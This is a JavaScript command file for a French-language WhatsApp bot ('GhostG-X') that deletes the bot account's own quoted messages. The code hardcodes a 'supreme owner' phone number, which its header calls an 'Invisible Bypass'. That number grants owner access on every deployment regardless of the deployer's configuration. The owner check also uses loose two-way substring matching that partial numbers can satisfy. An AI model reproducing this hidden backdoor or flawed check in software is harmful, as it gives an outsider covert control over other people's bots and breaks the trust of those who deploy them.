/**
 * Erreur Command - GhostG-X Edition
 * Supprime un de tes propres messages auquel tu as répondu
 * Sécurité : Supreme Owner Master Access (Invisible Bypass)
 */

const config = require('../../config.js');

// Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
function toSmallCaps(text) {
  const normal = "abcdefghijklmnopqrstuvwxyz0123456789";
  const smallCaps = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789";

  const cleanedText = text.toLowerCase()
    .normalize("NFD").replace(/[\u0300-\u036f]/g, ""); 

  return cleanedText.split('').map(c => {
    const index = normal.indexOf(c);
    return index !== -1 ? smallCaps[index] : c;
  }).join('');
}

const prefix = config.prefix || '.';

module.exports = {
  name: 'erreur',
  aliases: ['er', 'error'],
  category: '♛ sᴏᴜᴠᴇʀᴀɪɴᴇᴛᴇ́',
  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ sᴜᴘᴘʀɪᴍᴇ ᴜɴ ᴅᴇ ᴛᴇs ᴘʀᴏᴘʀᴇs ᴍᴇssᴀɢᴇs ᴇɴ ʏ ʀᴇᴘᴏɴᴅᴀɴᴛ**',
  usage: `${prefix}erreur`,

  async execute(sock, msg, args, extra) {
    const { from, reply, react } = extra;

    try {
      const senderJid = msg.key.participant || msg.key.remoteJid;
      const senderNumber = senderJid.replace(/\D/g, '');

      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
      const supremeOwner = '22651622652';
      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);

      // SÉCURITÉ : Vérification via le config.js
      const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
        const cleanN = String(n).replace(/\D/g, '');
        return senderNumber.includes(cleanN) || cleanN.includes(senderNumber);
      });

      const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;

      // Seul le cercle des maîtres peut manipuler le temps
      if (!isMe) {
        return reply(`*❌ ${toSmallCaps('acces refuse. seul le maitre peut manier la gomme du spatio-temporel')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
      }

      const ctx = msg.message?.extendedTextMessage?.contextInfo;

      // Vérification si on a bien répondu à un message
      if (!ctx?.stanzaId) {
        return reply(
          `╭╼━≪• *💥 ᴇᴠᴀᴘᴏʀᴀᴛɪᴏɴ_ɪᴍᴍᴇᴅɪᴀᴛᴇ* •≫━╾╮\n` +
          `┃ *ᴇ́ᴛᴀᴛ* : ᴇ́ᴄʜᴇᴄ ❌\n` +
          `╰━━━━━━━━━━━━━━━╯\n\n` +
          `*🔮 ɪɴᴄᴀɴᴛᴀᴛɪᴏɴ :*\n` +
          `*${toSmallCaps('reponds a ton propre message que tu souhaites effacer')}.*\n\n` +
          `  ${prefix}erreur\n\n` +
          `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
        );
      }

      const botJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';

      // On récupère le JID de la personne qui a écrit le message cité
      const quotedParticipant = ctx.participant || ctx.remoteJid;

      // SÉCURITÉ : On vérifie si le message cité vient bien de TOI ou du BOT lui-même
      const isFromMe = quotedParticipant.includes(botJid) || msg.key.fromMe;

      if (!isFromMe) {
        return reply(`*⚠️ ${toSmallCaps('ce message ne t\'appartient pas. utilise la commande')} \`${prefix}delete\` ${toSmallCaps('pour les messages des autres')}.*`);
      }

      // 1. Clé pour supprimer TON message cité
      const deleteTargetKey = { 
        remoteJid: from, 
        id: ctx.stanzaId, 
        fromMe: true // INDISPENSABLE pour supprimer ses propres messages
      };

      // Si c'est un groupe, Baileys a parfois besoin du participant original
      if (from.endsWith('@g.us')) {
        deleteTargetKey.participant = quotedParticipant;
      }

      // 2. Clé pour supprimer le message de commande actuel (.erreur)
      const deleteCommandKey = {
        remoteJid: from,
        id: msg.key.id,
        fromMe: true
      };

      await react('🪄'); // Petit effet magique

      // On exécute les deux suppressions
      await sock.sendMessage(from, { delete: deleteTargetKey });
      await sock.sendMessage(from, { delete: deleteCommandKey });

    } catch (error) {
      console.error('Erreur command error:', error);
      await reply(`*❌ ${toSmallCaps('impossible de faire disparaitre ce message')}.*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
    }
  }
};
